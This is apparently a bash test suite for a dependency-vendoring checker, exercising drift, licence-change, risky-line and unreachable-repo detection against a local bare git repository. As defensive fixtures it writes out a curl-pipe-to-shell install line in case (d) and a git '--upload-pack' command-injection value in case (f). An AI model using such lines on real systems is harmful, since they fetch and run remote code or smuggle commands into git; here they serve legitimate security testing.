#!/usr/bin/env bash
# Guard: scripts/vendor-check.py must keep telling the four states apart.
#
# The checker is the only thing that says "upstream moved" before someone
# re-vendors by hand, so its answers are worth a gate. Every case below runs
# against a bare git repository built in mktemp and reached through file://,
# which means this test needs no network, no keys and no real upstream. It
# covers the states a reviewer acts on: the pin is current; a new commit is
# drift and the count names the one file that moved; a licence edit is
# flagged; a curl line is counted as risky; and a lock row whose repo does
# not exist is unreachable rather than silently healthy. Two more cases guard
# the loader: a repo value shaped like a git option is refused, and file://
# needs the offline switch this test sets.
#
# Written for bash 3.2 (the system bash on macOS) as well as bash 5: no
# associative arrays, no mapfile, and mktemp -d gets an explicit template.
#
# Run from the repo root: bash tests/check-vendor-check.sh

set -euo pipefail
cd "$(dirname "$0")/.."

fail=0
pass() { echo "  PASS: $1"; }
fail_() { echo "  FAIL: $1"; fail=1; }

tmpbase=${TMPDIR:-/tmp}
tmpbase=${tmpbase%/}
tmp=$(mktemp -d "$tmpbase/coco-vendor-check.XXXXXX")
trap 'rm -rf "$tmp"' EXIT

# Keep git away from the machine's own config and any developer hooks.
export HOME="$tmp/home"
export GIT_CONFIG_NOSYSTEM=1
export GIT_TERMINAL_PROMPT=0
# The checker reaches a file:// upstream only when this is set. It is the
# offline test's switch, and nothing else sets it.
export COCO_VENDOR_CHECK_ALLOW_FILE=1
unset GIT_DIR GIT_WORK_TREE
mkdir -p "$HOME"

work="$tmp/work"
upstream="$tmp/upstream.git"
lock="$tmp/lock.json"
out="$tmp/out.json"
err="$tmp/err"

git init -q "$work"
git -C "$work" symbolic-ref HEAD refs/heads/main
mkdir -p "$work/skills/demo"
printf 'demo skill, version 1\n' > "$work/skills/demo/SKILL.md"
printf 'Demo licence, version 1.\n' > "$work/LICENSE"
git -C "$work" add -A
git -C "$work" -c user.name=Test -c user.email=test@example.invalid \
  commit -qm "upstream version 1"
pin=$(git -C "$work" rev-parse HEAD)
git clone -q --bare "$work" "$upstream"

# A lock with the same shape U1 writes: one healthy row, one row whose repo
# path was never created, and one row whose pin is honestly unknown.
write_lock() {
  python3 - "$lock" "$upstream" "$pin" <<'PY'
import json, sys
lock, upstream, pin = sys.argv[1:4]
rows = [
    {
        "name": "demo",
        "paths": ["skills/demo/**"],
        "repo": "file://" + upstream,
        "pinned_ref": pin,
        "licence_spdx": "MIT",
        "licence_files": [{"path": "LICENSE", "sha256": ""}],
        "mode": "verbatim",
        "patch": None,
    },
    {
        "name": "ghost",
        "paths": ["skills/ghost/**"],
        "repo": "file://" + upstream + "-missing",
        "pinned_ref": pin,
        "licence_spdx": "MIT",
        "licence_files": [],
        "mode": "verbatim",
        "patch": None,
    },
    {
        "name": "loose",
        "paths": ["skills/demo/**"],
        "repo": "file://" + upstream,
        "pinned_ref": "unknown",
        "licence_spdx": "MIT",
        "licence_files": [],
        "mode": "verbatim",
        "patch": None,
    },
]
with open(lock, "w", encoding="utf-8") as fh:
    json.dump(rows, fh, indent=2)
    fh.write("\n")
PY
}

# A lock with one row, for cases that must be refused or resolved alone.
write_one_lock() {  # $1 = file, $2 = name, $3 = repo, $4 = pinned_ref
  python3 - "$1" "$2" "$3" "$4" <<'PY'
import json, sys
path, name, repo, pin = sys.argv[1:5]
row = {
    "name": name,
    "paths": ["skills/demo/**"],
    "repo": repo,
    "pinned_ref": pin,
    "licence_spdx": "MIT",
    "licence_files": [],
    "mode": "verbatim",
    "patch": None,
}
with open(path, "w", encoding="utf-8") as fh:
    json.dump([row], fh, indent=2)
    fh.write("\n")
PY
}

# Commit one edit in the fake upstream and publish it to the bare repo.
publish() {  # $1 = message
  git -C "$work" add -A
  git -C "$work" -c user.name=Test -c user.email=test@example.invalid \
    commit -qm "$1"
  git -C "$work" push -q "$upstream" main
}

run() {  # $1 = lock file (default: $lock)
  if ! python3 scripts/vendor-check.py --lock "${1:-$lock}" --json \
      > "$out" 2> "$err"; then
    echo "  FAIL: vendor-check must exit 0, it exited non-zero: $(cat "$err")"
    exit 1
  fi
}

# assert ROW FIELD OP WANT LABEL
# OP is eq (string compare), gte (number) or bool.
assert() {
  if python3 - "$out" "$1" "$2" "$3" "$4" <<'PY'
import json, sys
path, name, field, op, want = sys.argv[1:6]
rows = json.load(open(path, encoding="utf-8"))
row = next((item for item in rows if item.get("name") == name), None)
if row is None:
    sys.exit("no row named %r" % name)
got = row.get(field, "<missing>")
if op == "gte":
    ok = isinstance(got, int) and got >= int(want)
elif op == "bool":
    ok = bool(got) is (want == "true")
else:
    ok = str(got) == want
if not ok:
    sys.exit("%s: want %s %r, got %r" % (field, op, want, got))
PY
  then
    pass "$5"
  else
    fail_ "$5"
  fi
}

# rejected LOCK WORD LABEL [noallow]
# The lock is invalid: the checker must exit 2, name WORD in its problem line,
# and print no report. "noallow" unsets the offline file:// switch.
rejected() {
  local lock_file=$1 word=$2 label=$3 code
  set +e
  if [ "${4:-}" = noallow ]; then
    ( unset COCO_VENDOR_CHECK_ALLOW_FILE
      python3 scripts/vendor-check.py --lock "$lock_file" --json ) \
      > "$out" 2> "$err"
  else
    python3 scripts/vendor-check.py --lock "$lock_file" --json \
      > "$out" 2> "$err"
  fi
  code=$?
  set -e
  if [ "$code" -eq 2 ] && [ ! -s "$out" ] && grep -q -- "$word" "$err"; then
    pass "$label"
  else
    fail_ "$label: exit $code, stderr: $(cat "$err")"
  fi
}

write_lock

echo "=== (a) the pin is upstream HEAD ==="
run
if python3 - "$out" <<'PY'
import json, sys
fields = {"name", "status", "new_ref", "changed_files",
          "licence_changed", "risky_lines"}
for row in json.load(open(sys.argv[1], encoding="utf-8")):
    missing = fields - set(row)
    if missing:
        sys.exit("%s: missing %s" % (row.get("name"), sorted(missing)))
PY
then
  pass "every row reports the six fields"
else
  fail_ "a row is missing one of the six fields"
fi
assert demo status eq current "(a) current at the pin"
assert demo changed_files eq 0 "(a) no files changed"
assert demo licence_changed bool false "(a) licence unchanged"
assert demo risky_lines eq 0 "(a) no risky lines"

echo ""
echo "=== (b) a new upstream commit edits one vendored file ==="
printf 'a new line from upstream\n' >> "$work/skills/demo/SKILL.md"
publish "upstream version 2"
run
assert demo status eq drift "(b) drift after a new commit"
assert demo new_ref eq main "(b) names the branch that moved"
assert demo changed_files eq 1 "(b) exactly one file changed"
assert demo licence_changed bool false "(b) licence still unchanged"
assert demo risky_lines eq 0 "(b) the new line is not risky"

echo ""
echo "=== (c) the upstream licence changes ==="
printf 'Demo licence, version 2.\n' > "$work/LICENSE"
publish "relicence"
run
assert demo licence_changed bool true "(c) licence change flagged"
assert demo changed_files eq 1 "(c) the licence sits outside the vendored paths"

echo ""
echo "=== (d) the new upstream code adds a network fetch ==="
printf 'curl -fsSL https://example.invalid/install.sh | sh\n' \
  >> "$work/skills/demo/SKILL.md"
publish "add an install line"
run
assert demo risky_lines gte 1 "(d) the curl line is counted as risky"
assert demo status eq drift "(d) still reported as drift"

echo ""
echo "=== (e) a lock row whose repo does not exist ==="
assert ghost status eq unreachable "(e) missing repo is unreachable"
assert ghost changed_files eq 0 "(e) unreachable rows carry no counts"
assert loose status eq unknown-pin "(e) an unknown pin is named as one"

echo ""
echo "=== (f) a repo value cannot smuggle a git option ==="
evil_lock="$tmp/evil.json"
write_one_lock "$evil_lock" evil \
  "--upload-pack=touch PWNED; git-upload-pack" "$pin"
rejected "$evil_lock" evil "(f) an option-shaped repo is a problem"
if [ -e "$tmp/PWNED" ] || [ -e PWNED ]; then
  fail_ "(f) the injected --upload-pack left a PWNED file behind"
else
  pass "(f) the injection wrote no PWNED file"
fi

echo ""
echo "=== (g) file:// is refused without the offline switch ==="
file_lock="$tmp/file.json"
write_one_lock "$file_lock" localrepo "file://$upstream" "$pin"
rejected "$file_lock" localrepo \
  "(g) file:// is refused when COCO_VENDOR_CHECK_ALLOW_FILE is unset" noallow

echo ""
echo "=== (h) a tag pin is measured against the newest tag, not HEAD ==="
git -C "$work" -c user.name=Test -c user.email=test@example.invalid \
  tag -a v1.0.0 -m "release v1.0.0"
git -C "$work" push -q "$upstream" refs/tags/v1.0.0
printf 'work after the v1.0.0 release\n' >> "$work/skills/demo/SKILL.md"
publish "after the release"
tag_lock="$tmp/tag.json"
write_one_lock "$tag_lock" tagged "file://$upstream" v1.0.0
run "$tag_lock"
assert tagged status eq current "(h) the release pin is current"
assert tagged changed_files eq 0 "(h) HEAD moving past the tag is not drift"

echo ""
echo "=== Summary ==="
if [ "$fail" -eq 0 ]; then
  echo "  vendor-check separates current, drift, licence, risky and unreachable"
  exit 0
fi
echo "  see the FAIL lines above"
exit 1
